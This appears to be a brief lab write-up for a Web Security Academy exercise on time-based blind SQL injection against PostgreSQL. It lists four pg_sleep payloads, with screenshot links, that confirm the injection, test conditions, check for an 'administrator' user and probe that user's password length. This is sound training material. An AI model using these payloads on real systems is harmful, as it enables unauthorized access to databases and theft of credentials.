`'||pg_sleep(5)--`
![grafik](https://github.com/alireza-cloud/Burp-Challenge-Web-Security-Academy/assets/62068604/aa01a99e-522a-4a3e-ac99-e4bed0ee5084)  
  
`'||CASE WHEN (1=1)THEN pg_sleep(2) ELSE '' END--`  
![grafik](https://github.com/alireza-cloud/Burp-Challenge-Web-Security-Academy/assets/62068604/af1278b4-80c4-4a2c-9b6b-d2fc9b8da89c)  
  
`';SELECT CASE WHEN (username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--`
![grafik](https://github.com/alireza-cloud/Burp-Challenge-Web-Security-Academy/assets/62068604/cde92bb8-2f19-4a6c-a125-7726f5114bac)  

`';SELECT CASE WHEN LENGTH(password)=20 THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--`
![grafik](https://github.com/alireza-cloud/Burp-Challenge-Web-Security-Academy/assets/62068604/d2b5fc02-d944-4747-a258-ae6a161fc2b5)




